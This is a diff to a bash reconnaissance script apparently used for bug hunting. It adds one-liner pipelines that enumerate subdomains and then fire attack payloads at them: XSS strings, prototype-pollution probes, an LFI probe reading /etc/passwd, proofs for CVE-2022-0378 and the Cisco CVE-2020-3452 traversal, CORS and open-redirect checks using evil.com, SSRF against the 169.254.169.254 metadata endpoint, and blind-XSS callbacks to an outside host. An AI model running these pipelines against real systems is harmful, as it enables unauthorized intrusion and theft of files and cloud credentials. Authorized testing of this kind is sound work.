@@ -17,8 +17,11 @@ fi
 host $domain | anew hostinfo.txt 
 dig $domain any | anew diginfo.txt
 subfinder -d $domain -o op.txt
-assetfinder --subs-only $domain | anew op.txt
 
+subfinder -d $domain -all -silent | httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' FILE.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE" | tee -a vPrototype-Pollution.txt
+ rm -rf FILE.txt
+assetfinder --subs-only $domain | anew op.txt
+assetfinder --subs-only $domain | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" | sed -e 's, 'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars"; done | tee -a vjavascript.txt
 amass enum -passive -d $domain | anew op.txt
 amass enum -active -d $domain | anew amass_ips.txt
 crobat -s $domain | anew amass_ips.txt
@@ -26,6 +29,11 @@ cat amass_ips.txt | awk '{print $1}' | anew op.txt
 
 cat op.txt | sort -u | anew all.txt 
 cat all.txt | httprobe | anew alive2.txt
+cat alive2.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done | tee -a cve-2022-0378.txt
+while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < alive2.txt | tee -a cve-2020-3452.txt
+
+
+
 
 cat alive2.txt | sort -u | anew alive.txt
 cat alive.txt | jsubfinder | anew sn.txt
@@ -53,14 +61,22 @@ cat waybackdata | gf xss | anew gfpatternsscan/xssGF.txt
 cat waybackdata | gf ssti | anew gfpatternsscan/sstiGF.txt
 cat waybackdata | gf sqli | anew gfpatternsscan/sqliGF.txt
 cat waybackdata | gf rce |  anew gfpatternsscan/rceGF.txt
-cat waybackdata | gf lif | anew gfpatternsscan/lfiGF.txt
+
+gau $domain | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"' | tee -a vlfi.txt
 cat waybackdata | gf ssrf | anew gfpatternsscan/ssrfparamsGF.txt 
 
+site="$domain"; gau "$site" | while read url; do target=$(curl -sIH "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found] echo $url; else echo Nothing on "$url"; fi; done | tee -a cors.txt
+waybackurls $domain | gf xss | sed 's/=.*/=/' | sort -u | tee FILE.txt && cat FILE.txt | dalfox -b YOURS.xss.ht pipe > vvxss.txt
+gospider -S gfpatternsscan/xssGF.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee v1xss.txt   
+gospider -S gfpatternsscan/xssGF.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>' | tee -a xss2.txt
+export LHOST="waybackdata"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"' | tee -a vOpen-redirect.txt
 
-   
+
+
+
 cat gfpatternsscan/xssGF.txt | sed "s/'\|(\|)//g" | bhedak "FUZZ" | anew -q xss.txt
 
-cat gfpatternsscan/lfiGF.txt | sed "s/'\|(\|)//g" | bhedak "FUZZ" | anew -q lfi.txt
+
 cat gfpatternsscan/rceGF.txt | sed "s/'\|(\|)//g" | bhedak "FUZZ" | anew -q rce.txt
 cat gfpatternsscan/ssrfparamsGF.txt | sed "s/'\|(\|)//g" | bhedak "http://169.254.169.254/latest/meta-data/hostname" | anew -q ssrf.txt
 cat gfpatternsscan/sstiGF.txt | sed "s/'\|(\|)//g" | bhedak "FUZZ" | anew -q ssti.txt
@@ -69,6 +85,8 @@ cat gfpatternsscan/redirectGF.txt | sed "s/'\|(\|)//g" | bhedak "http://www.evil
 
  xargs -a gfpatternsscan/xssGF.txt -P 30 -I % bash -c "echo % | kxss" | grep "< >\|\"" | anew -q xss1.txt
  rm -rf gfpatternsscan
+ 
+ 
  cat xss1.txt | bhedak "\">/><svg/onload=confirm(document.domain)>" | anew -q xss.txt
 
  cat sn.txt | python3 -c "import sys; import json; print (json.dumps({'vuln_crlf':list(sys.stdin)}))" | sed 's/\\n//g' | tee sn1.txt
